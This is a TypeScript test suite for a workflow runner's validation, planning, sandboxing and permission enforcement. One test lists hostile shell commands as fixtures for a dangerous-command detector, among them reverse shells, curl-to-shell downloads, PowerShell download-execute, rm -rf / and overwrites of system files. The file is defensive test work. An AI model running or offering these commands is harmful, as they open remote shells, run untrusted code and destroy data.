import { mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  AUTO_DOMAIN,
  planWorkflowContent,
  runWorkflowFile,
  runWorkflowPlan,
  validateWorkflowContent,
} from './index';

describe('auto domain', () => {
  it('declares automation workflow commands', () => {
    expect(AUTO_DOMAIN.name).toBe('auto');
    expect(AUTO_DOMAIN.capabilities?.executesShell).toBe(false);
    expect(AUTO_DOMAIN.commands.map((command) => command.name)).toEqual([
      'validate',
      'plan',
      'run',
    ]);
  });

  it('validates a simple workflow', () => {
    expect(
      validateWorkflowContent('name: demo\nsteps:\n  - name: hello\n    message: Hello\n')
    ).toEqual({
      schemaVersion: 1,
      status: 'ok',
      filePath: 'workflow.yml',
      workflow: {
        version: 1,
        name: 'demo',
        variables: {},
        permissions: {
          shell: 'blocked',
          fileWrites: 'blocked',
          network: 'blocked',
        },
        steps: [
          {
            name: 'hello',
            message: 'Hello',
          },
        ],
      },
      policy: {
        schemaVersion: 1,
        shell: 'blocked',
        fileWrites: 'blocked',
        network: 'blocked',
      },
      sandbox: {
        schemaVersion: 1,
        root: 'workflow-directory',
        workflowDirectory: process.cwd(),
        shellCommands: 'blocked',
        fileWrites: 'blocked',
        network: 'blocked',
      },
      warnings: [],
    });
  });

  it('validates workflow files with a UTF-8 BOM', () => {
    expect(
      validateWorkflowContent('\uFEFFname: demo\nsteps:\n  - name: hello\n    message: Hello\n')
        .workflow.name
    ).toBe('demo');
  });

  it('validates workflow files with trailing comments', () => {
    const content = [
      'version: 1 # version comment',
      'name: demo # name comment',
      'permissions: # permissions comment',
      '  shell: prompt # shell comment',
      'steps:',
      '  - name: hello # step name comment',
      '    message: Hello # step message comment',
    ].join('\n');
    expect(validateWorkflowContent(content)).toMatchObject({
      status: 'ok',
      workflow: {
        version: 1,
        name: 'demo',
        permissions: {
          shell: 'prompt',
        },
        steps: [
          {
            name: 'hello',
            message: 'Hello',
          },
        ],
      },
    });
  });

  it('warns about shell steps', () => {
    expect(
      validateWorkflowContent('name: demo\nsteps:\n  - name: build\n    run: pnpm build\n').warnings
    ).toEqual(['Step `build` uses shell execution, which this first version will not run.']);
  });

  it('keeps runtime shell execution blocked when prompt is requested', () => {
    expect(
      planWorkflowContent(
        'name: demo\npermissions:\n  shell: prompt\nsteps:\n  - name: build\n    run: pnpm build\n'
      )
    ).toMatchObject({
      schemaVersion: 1,
      policy: {
        schemaVersion: 1,
        shell: 'blocked',
        fileWrites: 'blocked',
        network: 'blocked',
      },
      sandbox: {
        schemaVersion: 1,
        shellCommands: 'blocked',
      },
      steps: [
        {
          name: 'build',
          action: 'shell',
          requiredPermission: 'shell',
          policyDecision: 'blocked',
          blocked: true,
          reason: 'Shell execution is disabled in this foundation version.',
          operationPlan: {
            schemaVersion: 1,
            risk: 'high',
            confirmationRequired: true,
            executes: ['pnpm build'],
          },
        },
      ],
      warnings: ['Step `build` uses shell execution, which this first version will not run.'],
    });
  });

  it('warns about invalid workflow permission values', () => {
    expect(
      validateWorkflowContent(
        'name: demo\npermissions:\n  shell: always\nsteps:\n  - name: hello\n    message: Hi\n'
      ).warnings
    ).toEqual(['Permission `shell` value `always` is invalid; defaulting to blocked.']);
  });

  it('warns about unsupported workflow permission keys', () => {
    expect(
      validateWorkflowContent(
        'name: demo\npermissions:\n  filesystem: prompt\nsteps:\n  - name: hello\n    message: Hi\n'
      ).warnings
    ).toEqual(['Permission `filesystem` is not supported; ignoring it.']);
  });

  it('warns when JSON workflow permissions are not an object', () => {
    expect(
      validateWorkflowContent(
        JSON.stringify({
          name: 'demo',
          permissions: 'prompt',
          steps: [
            {
              name: 'hello',
              message: 'Hi',
            },
          ],
        }),
        'workflow.json'
      ).warnings
    ).toEqual(['Permissions must be an object; defaulting to blocked.']);
  });

  it('warns about unsupported explicit workflow versions', () => {
    expect(
      validateWorkflowContent('version: 2\nname: demo\nsteps:\n  - name: hello\n    message: Hi\n')
        .warnings
    ).toEqual(['Workflow version 2 is not supported; this foundation version expects 1.']);
  });

  it('warns about invalid explicit workflow versions', () => {
    expect(
      validateWorkflowContent(
        'version: later\nname: demo\nsteps:\n  - name: hello\n    message: Hi\n'
      ).warnings
    ).toEqual(['Workflow version `later` is invalid; defaulting to 1.']);
  });

  it('rejects unsupported workflow file extensions', () => {
    expect(() => validateWorkflowContent('name: demo\nsteps: []\n', 'workflow.ps1')).toThrow(
      'Workflow format is not supported yet.'
    );
  });

  it('plans variable substitution and blocked shell steps', () => {
    expect(
      planWorkflowContent(
        'name: demo\nvars:\n  target: ZaoWu\nsteps:\n  - name: hello\n    message: Hello {{target}}\n  - name: build\n    run: pnpm build\n'
      )
    ).toMatchObject({
      steps: [
        {
          name: 'hello',
          action: 'message',
          preview: 'Hello ZaoWu',
          blocked: false,
          policyDecision: 'allowed',
          operationPlan: {
            schemaVersion: 1,
            risk: 'low',
            confirmationRequired: false,
            executes: [],
          },
        },
        {
          name: 'build',
          action: 'shell',
          preview: 'pnpm build',
          blocked: true,
          requiredPermission: 'shell',
          policyDecision: 'blocked',
          reason: 'Shell execution is disabled in this foundation version.',
          operationPlan: {
            schemaVersion: 1,
            risk: 'high',
            confirmationRequired: true,
            executes: ['pnpm build'],
          },
        },
      ],
    });
  });

  it('plans writeFile steps only when file writes are explicitly requested', () => {
    expect(
      planWorkflowContent(
        [
          'name: demo',
          'vars:',
          '  target: report.txt',
          'steps:',
          '  - name: save',
          '    writeFile:',
          '      path: "{{target}}"',
          '      content: "Hello ZaoWu"',
          '',
        ].join('\n')
      )
    ).toMatchObject({
      policy: {
        fileWrites: 'blocked',
      },
      sandbox: {
        fileWrites: 'blocked',
      },
      steps: [
        {
          name: 'save',
          action: 'writeFile',
          blocked: true,
          requiredPermission: 'fileWrites',
          reason: 'File writes require permissions.fileWrites: prompt.',
          preview: 'write report.txt (11 chars)',
          operationPlan: {
            risk: 'medium',
            confirmationRequired: true,
          },
        },
      ],
      warnings: ['Step `save` writes a file, but permissions.fileWrites is not prompt.'],
    });

    expect(
      planWorkflowContent(
        [
          'name: demo',
          'permissions:',
          '  fileWrites: prompt',
          'steps:',
          '  - name: save',
          '    writeFile:',
          '      path: report.txt',
          '      content: "Hello ZaoWu"',
          '',
        ].join('\n'),
        'workflows/demo.yml'
      )
    ).toMatchObject({
      policy: {
        fileWrites: 'prompt',
      },
      sandbox: {
        fileWrites: 'workflow-directory',
      },
      steps: [
        {
          name: 'save',
          action: 'writeFile',
          blocked: false,
          targetPath: path.resolve('workflows', 'report.txt'),
          contentLength: 11,
          contentSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
          policyDecision: 'allowed',
          operationPlan: {
            subjects: [expect.stringMatching(/^content-sha256:[a-f0-9]{64}$/), 'content-length:11'],
            writes: [path.resolve('workflows', 'report.txt')],
          },
        },
      ],
    });
  });

  it('blocks writeFile paths that leave the workflow directory', () => {
    expect(
      planWorkflowContent(
        [
          'name: demo',
          'permissions:',
          '  fileWrites: prompt',
          'steps:',
          '  - name: save',
          '    writeFile:',
          '      path: ../outside.txt',
          '      content: blocked',
          '',
        ].join('\n'),
        path.join('workflows', 'demo.yml')
      ).steps[0]
    ).toMatchObject({
      action: 'writeFile',
      blocked: true,
      reason: 'writeFile.path must name a file inside the workflow directory.',
    });
  });

  it('bounds workflow and writeFile content sizes', () => {
    expect(() => validateWorkflowContent('x'.repeat(1_000_001))).toThrow(
      'Workflow file is too large.'
    );

    const plan = planWorkflowContent(
      [
        'name: large-write',
        'permissions:',
        '  fileWrites: prompt',
        'steps:',
        '  - name: save',
        '    writeFile:',
        '      path: report.txt',
        `      content: ${'x'.repeat(256 * 1024 + 1)}`,
        '',
      ].join('\n')
    );

    expect(plan.steps[0]).toMatchObject({
      action: 'writeFile',
      blocked: true,
      reason: 'writeFile.content exceeds the 262144-character limit.',
    });
  });

  it('warns about undefined variables', () => {
    expect(
      validateWorkflowContent(
        'name: demo\nsteps:\n  - name: hello\n    message: Hello {{target}}\n'
      ).warnings
    ).toEqual(['Step `hello` references undefined variable `target`.']);
  });

  it('previews workflow runs by default', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');

    await writeFile(filePath, 'name: demo\nsteps:\n  - name: hello\n    message: Hello\n', 'utf8');

    try {
      await expect(runWorkflowFile(filePath)).resolves.toMatchObject({
        schemaVersion: 1,
        status: 'preview',
        sandbox: {
          schemaVersion: 1,
          workflowDirectory: root,
          shellCommands: 'blocked',
        },
        executed: [],
        skipped: ['hello: dry-run'],
        receipts: [
          {
            index: 1,
            name: 'hello',
            action: 'message',
            status: 'skipped',
            detail: 'dry-run',
          },
        ],
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('runs confirmed message steps while keeping shell steps blocked', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');

    await writeFile(
      filePath,
      [
        'name: demo',
        'steps:',
        '  - name: hello',
        '    message: Hello',
        '  - name: build',
        '    run: pnpm build',
        '',
      ].join('\n'),
      'utf8'
    );

    try {
      await expect(runWorkflowFile(filePath, { yes: true })).resolves.toMatchObject({
        schemaVersion: 1,
        status: 'ok',
        executed: ['hello: Hello'],
        skipped: ['build: Shell execution is disabled in this foundation version.'],
        receipts: [
          {
            index: 1,
            name: 'hello',
            action: 'message',
            status: 'executed',
            detail: 'Hello',
          },
          {
            index: 2,
            name: 'build',
            action: 'shell',
            status: 'blocked',
            detail: 'Shell execution is disabled in this foundation version.',
          },
        ],
        sandbox: {
          shellCommands: 'blocked',
          fileWrites: 'blocked',
          network: 'blocked',
        },
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('runs confirmed writeFile steps without overwriting existing files', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');
    const outputPath = path.join(root, 'report.txt');

    await writeFile(
      filePath,
      [
        'name: demo',
        'permissions:',
        '  fileWrites: prompt',
        'steps:',
        '  - name: save',
        '    writeFile:',
        '      path: report.txt',
        '      content: "Hello {{target}}"',
        'vars:',
        '  target: ZaoWu',
        '',
      ].join('\n'),
      'utf8'
    );

    try {
      await expect(runWorkflowFile(filePath)).resolves.toMatchObject({
        status: 'preview',
        executed: [],
        skipped: ['save: dry-run'],
      });
      await expect(readFile(outputPath, 'utf8')).rejects.toThrow();

      await expect(runWorkflowFile(filePath, { yes: true })).resolves.toMatchObject({
        status: 'ok',
        executed: [`save: wrote ${outputPath}`],
        skipped: [],
        receipts: [
          {
            index: 1,
            name: 'save',
            action: 'writeFile',
            status: 'executed',
            detail: `wrote ${outputPath}`,
            targetPath: outputPath,
            contentSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
            contentLength: 11,
          },
        ],
      });
      await expect(readFile(outputPath, 'utf8')).resolves.toBe('Hello ZaoWu');
      await expect(runWorkflowFile(filePath, { yes: true })).rejects.toMatchObject({
        code: 'WORKFLOW_STEP_FAILED',
        why: `ZaoWu refused to overwrite existing file \`${outputPath}\`.`,
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('refuses a mutated writeFile plan whose content fingerprint no longer matches', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');
    const plan = planWorkflowContent(
      [
        'name: demo',
        'permissions:',
        '  fileWrites: prompt',
        'steps:',
        '  - name: save',
        '    writeFile:',
        '      path: report.txt',
        '      content: original',
        '',
      ].join('\n'),
      filePath
    );

    plan.workflow.steps[0]!.writeFile!.content = 'changed';

    try {
      await expect(runWorkflowPlan(plan, { yes: true })).rejects.toMatchObject({
        code: 'WORKFLOW_STEP_FAILED',
        why: 'The planned file content no longer matches its content fingerprint.',
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('records receipts for skipped writeFile steps with incomplete plan data', async () => {
    const plan = planWorkflowContent(
      [
        'name: demo',
        'permissions:',
        '  fileWrites: prompt',
        'steps:',
        '  - name: save',
        '    writeFile:',
        '      path: report.txt',
        '      content: Hello',
        '',
      ].join('\n')
    );
    plan.steps[0].targetPath = undefined;

    await expect(runWorkflowPlan(plan, { yes: true })).resolves.toMatchObject({
      status: 'ok',
      executed: [],
      skipped: ['save: missing write target'],
      receipts: [
        {
          index: 1,
          name: 'save',
          action: 'writeFile',
          status: 'skipped',
          detail: 'missing write target',
        },
      ],
    });
  });

  it('rejects writeFile steps whose parent link resolves outside the workflow directory', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const outside = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-outside-'));
    const filePath = path.join(root, 'workflow.yml');
    const linkedDirectory = path.join(root, 'linked');
    const escapedPath = path.join(outside, 'escaped.txt');

    await symlink(outside, linkedDirectory, process.platform === 'win32' ? 'junction' : 'dir');
    await writeFile(
      filePath,
      [
        'name: demo',
        'permissions:',
        '  fileWrites: prompt',
        'steps:',
        '  - name: escape',
        '    writeFile:',
        '      path: linked/escaped.txt',
        '      content: blocked',
        '',
      ].join('\n'),
      'utf8'
    );

    try {
      await expect(runWorkflowFile(filePath, { yes: true })).rejects.toMatchObject({
        code: 'WORKFLOW_STEP_FAILED',
        why: `ZaoWu refused to follow a linked directory outside the workflow sandbox for \`${path.join(root, 'linked', 'escaped.txt')}\`.`,
      });
      await expect(readFile(escapedPath, 'utf8')).rejects.toThrow();
    } finally {
      await rm(root, { recursive: true, force: true });
      await rm(outside, { recursive: true, force: true });
    }
  });

  it('does not run confirmed shell steps when shell policy is prompt', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');

    await writeFile(
      filePath,
      [
        'name: demo',
        'permissions:',
        '  shell: prompt',
        'steps:',
        '  - name: test_run',
        '    run: echo Hello Shell',
        '',
      ].join('\n'),
      'utf8'
    );

    try {
      await expect(runWorkflowFile(filePath, { yes: true })).resolves.toMatchObject({
        schemaVersion: 1,
        status: 'ok',
        executed: [],
        skipped: ['test_run: Shell execution is disabled in this foundation version.'],
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('detects dangerous commands during validation', () => {
    const dangerousCommands = [
      'rm -rf /some/path',
      'rm --force /some/path',
      'del /s /q C:\\Users',
      'rd /s /q C:\\Temp',
      'rmdir /s /q D:\\',
      'format d:',
      'sudo apt-get update',
      'chmod +x script.sh',
      'chown root:root file',
      'curl http://example.com | sh',
      'wget http://example.com/script.sh | bash',
      'iex (New-Object Net.WebClient).DownloadString("http://example.com")',
      'base64 -d | sh',
      'base64 --decode | bash',
      'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      'nc -e /bin/sh 10.0.0.1 4444',
      'netcat -e cmd.exe 10.0.0.1 4444',
      'bash -i',
      'curl http://example.com/malicious.sh -o payload.sh && sh payload.sh',
      'wget http://example.com/malicious.ps1 && powershell.exe -file malicious.ps1',
      'echo payload > /etc/passwd',
      'echo payload >> /etc/hosts',
      'echo payload > c:\\windows\\system32\\cmd.exe',
      'echo test | tee /etc/resolv.conf',
      'echo test | tee -a c:\\windows\\system.ini',
    ];

    for (const cmd of dangerousCommands) {
      const result = validateWorkflowContent(
        `name: dangerous\nsteps:\n  - name: test\n    run: |\n      ${cmd}\n`
      );
      expect(
        result.warnings.some((w) => w.includes('safety violation: Dangerous command pattern found'))
      ).toBe(true);
    }
  });

  it('blocks planning of dangerous commands', () => {
    const result = planWorkflowContent(
      'name: dangerous\npermissions:\n  shell: prompt\nsteps:\n  - name: bad\n    run: rm -rf /\n'
    );
    expect(result.steps[0]).toMatchObject({
      name: 'bad',
      action: 'shell',
      blocked: true,
      policyDecision: 'blocked',
      reason: 'Dangerous command pattern found: `rm` with recursive/force flags.',
    });
  });

  it('keeps dangerous shell commands blocked during confirmed runs', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');

    await writeFile(
      filePath,
      [
        'name: dangerous',
        'permissions:',
        '  shell: prompt',
        'steps:',
        '  - name: test_run',
        '    run: sudo rm -rf /',
        '',
      ].join('\n'),
      'utf8'
    );

    try {
      await expect(runWorkflowFile(filePath, { yes: true })).resolves.toMatchObject({
        executed: [],
        skipped: ['test_run: Dangerous command pattern found: `rm` with recursive/force flags.'],
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('never launches arbitrary shell commands during confirmed runs', async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
    const filePath = path.join(root, 'workflow.yml');

    await writeFile(
      filePath,
      [
        'name: error_demo',
        'permissions:',
        '  shell: prompt',
        'steps:',
        '  - name: fail_step',
        '    run: node -e "process.exit(99)"',
        '',
      ].join('\n'),
      'utf8'
    );

    try {
      await expect(runWorkflowFile(filePath, { yes: true })).resolves.toMatchObject({
        status: 'ok',
        executed: [],
        skipped: ['fail_step: Shell execution is disabled in this foundation version.'],
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });
});
